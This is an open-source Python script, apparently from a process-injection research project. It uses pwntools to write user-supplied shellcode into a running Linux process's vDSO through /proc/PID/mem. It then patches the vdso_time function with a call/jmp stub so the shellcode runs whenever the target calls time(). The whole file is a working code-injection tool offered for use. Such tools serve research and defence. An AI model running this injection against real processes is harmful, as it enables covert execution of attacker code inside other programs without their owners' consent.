#!/usr/bin/env python3
#
# This file is part of the linux-prinj project.
# https://gitlab.com/pgregoire/linux-prinj/
#
# Copyright 2022 Philippe Grégoire <git@pgregoire.xyz>
#
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

from pwn import *


context.log_level = 'critical'

# -------------------------------------------------------------------- #
# /proc/

def getmaps(pid):
    with open('/proc/{}/maps'.format(pid)) as fp:
        dat = fp.read()

    r = []
    for ln in [e for e in dat.split('\n') if e]:
        s = [e for e in ln.split(' ') if e]
        r += [{
          'addr': s[0],
          'from': int(s[0].split('-')[0], 16),
          'to': int(s[0].split('-')[1], 16),
          'perms': s[1],
          'offset': int(s[2], 16),
          'dev': s[3],
          'devmaj': int(s[3].split(':')[0], 16),
          'devmin': int(s[3].split(':')[1], 16),
          'inode': int(s[4]),
          'path': None if 5 == len(s) else s[5],
        }]

    return r


def proc_rdmem(pid, addr, cnt):
    with open('/proc/{}/mem'.format(pid), 'rb') as fp:
        fp.seek(addr)
        return fp.read(cnt)


def proc_wrmem(pid, addr, buf):
    with open('/proc/{}/mem'.format(pid), 'wb') as fp:
        fp.seek(addr)
        fp.write(buf)


def rdmap(pid, mp):
    return proc_rdmem(pid, mp['from'], mp['to']-mp['from'])

# -------------------------------------------------------------------- #

with open(sys.argv[1], 'rb') as fp:
    code = fp.read()
pid = int(sys.argv[2])

maps = getmaps(pid)

# Get the vDSO map and binary
for m in maps:
    if '[vdso]' == m['path']:
        vdso = m
assert(vdso)
vdsobin = rdmap(pid, m)

# Get the vvar map
for m in maps:
    if '[vvar]' == m['path']:
        vvar = m
assert(vvar)


# pwntools does not support loading ELF from bytes
with open('vdso.elf', 'wb') as fp:
    fp.write(vdsobin)
elf = ELF('vdso.elf')


# Locate vdso_time
gtod = [elf.symbols[k] for k in elf.symbols if 'vdso_time' in k][0]
gtod_addr = vdso['from'] + gtod
print('vdso_time is at offset {} (addr: {})'.format(hex(gtod), hex(gtod_addr)))


#
# time() simply reads from vvar and returns the value.
#
#   mov rax, vvar+0x80
#   mov rax, [rax+0x20]
#   ret
#
alt = b''
alt += b'\x48\xb8' + p64(vvar['from'] + 0x80)
alt += b'\x48\x8b\x40\x20'
alt += b'\xc3'

func_size = len(alt) + (8 - (len(alt) % 8))
func_addr = vdso['to'] - func_size
proc_wrmem(pid, func_addr, alt)


# Prepend the shellcode
code_size = len(code) + (8 - (len(code) % 8))
code_addr = func_addr - code_size
print('Writing shellcode @{}'.format(hex(code_addr)))
proc_wrmem(pid, code_addr, code)


#
# Redirector
#
# We now replace the target function's code with a small redirection
# shellcode. For it, we'll compute the relative offsets and complete
# the opcodes manually.
#
#     call shellcode
#     jmp altfunc
#
stub = b''
stub += b'\xe8' + p32(code_addr - gtod_addr - 5 - len(stub))
stub += b'\xe9' + p32(func_addr - gtod_addr - 5 - len(stub))

print('Writing redirection code @{}'.format(gtod_addr))
proc_wrmem(pid, gtod_addr, stub)
